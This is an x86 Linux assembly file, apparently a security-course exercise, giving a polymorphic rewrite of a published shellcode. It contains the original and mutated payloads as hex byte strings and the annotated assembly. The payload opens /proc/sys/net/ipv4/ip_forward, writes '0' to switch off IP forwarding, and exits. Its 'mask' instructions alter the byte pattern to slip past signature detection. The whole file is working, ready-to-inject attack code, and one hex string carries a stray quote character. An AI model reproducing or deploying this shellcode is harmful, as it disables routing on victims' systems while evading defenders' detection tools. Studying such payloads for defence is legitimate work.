;Description:	Polymorphic version of http://shell-storm.org/shellcode/files/shellcode-848.php
;Original Shellcode (83 bytes):	\x31\xc0\x50\x68\x77\x61\x72\x64\x68\x5f\x66\x6f\x72\x68\x34\x2f\x69\x70\x68\x2f\x69\x70\x76\x68\x2f\x6e\x65\x74\x68\x73\x79\x73\x2f\x68\x72\x6f\x63\x2f\x66\x68\x2f\x70\x89\xe3\x31\xc9\xb1\x01\xb0\x05\xcd\x80\x89\xc3\x31\xc9\x51\x6a\x30\x89\xe1\x31\xd2\xb2\x01\xb0\x04\xcd\x80\x31\xc0\x83\xc0\x06\xcd\x80\x31\xc0\x40\x31\xdb"\xcd\x80
;Polymorphic Shellcode (108 bytes):	\x89\xc3\x31\xd8\x89\x44\x24\xfc\x83\xec\x04\xc7\x44\x24\xfc\x77\x61\x72\x64\xc7\x44\x24\xf8\x5f\x66\x6f\x72\x83\xec\x08\xbb\x69\x70\x34\x2f\xc1\xc3\x10\x53\xbb\x1a\x10\x10\x63\x81\xc3\x15\x59\x60\x13\x53\x68\x2f\x6e\x65\x74\x68\x73\x79\x73\x2f\xbb\x63\x2f\x72\x6f\xc1\xc3\x10\x89\x5c\x24\xfc\x83\xec\x04\x66\x68\x2f\x70\x89\xe3\xb1\x01\xb0\x05\xcd\x80\x89\xc3\x6a\x30\x89\xe1\xb2\x01\xb0\x04\xcd\x80\xb0\x06\xcd\x80\xb0\x01\xcd\x80
;Author:	Paolo Stivanin <https://github.com/polslinux>
;SLAE ID:	526

global _start
section .text
_start:
	mov ebx,eax
	xor eax,ebx	;mask #1
	
	mov dword [esp-4], eax
	sub esp,4	;mask #2
	mov dword [esp-4],0x64726177
	mov dword [esp-8], 0x726f665f
	sub esp,8	;mask #3
	mov ebx,0x2f347069
	rol ebx,16
	push ebx	;mask #4
	mov ebx,0x6310101a
	add ebx,0x13605915
	push ebx	;mask #5
	push 0x74656e2f
	push 0x2f737973
	mov ebx,0x6f722f63
	rol ebx,16
	mov dword [esp-4],ebx
	sub esp,4	;mask #6
	push WORD 0x702f
	mov ebx,esp
	mov cl,0x1
	mov al,0x5
	int 0x80	;open /proc/sys/net/ipv4/ip_forward
	
	mov ebx,eax
	push 0x30
	mov ecx,esp
	mov dl,0x1
	mov al,0x4
	int 0x80	;write '0' (0x30)
	
	mov al,0x6
	int 0x80	;close
	
	mov al,0x1
	int 0x80	;exit
